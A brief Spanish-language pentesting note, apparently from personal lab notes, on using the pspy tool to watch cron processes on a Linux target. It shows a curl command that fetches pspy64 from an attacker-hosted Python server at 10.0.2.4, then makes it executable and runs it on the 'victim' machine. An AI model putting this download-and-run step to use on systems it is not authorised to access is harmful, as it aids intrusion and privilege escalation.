Sirve para ver los procesos cron que hay corriendo en una máquina linux para ello nos instalamos el programa de https://github.com/DominicBreuker/pspy y lo guardaremos en una carpeta, en esa carpeta levantaremos un servidor con python y lo descargaremos en la máquina victima finalmente se ejecuta dando permisos de ejecución.
```shell
curl -X GET http://10.0.2.4/pspy64 -o pspy64
chmod +x pspy64
./pspy64
```
![[Pasted image 20240309131555.png]]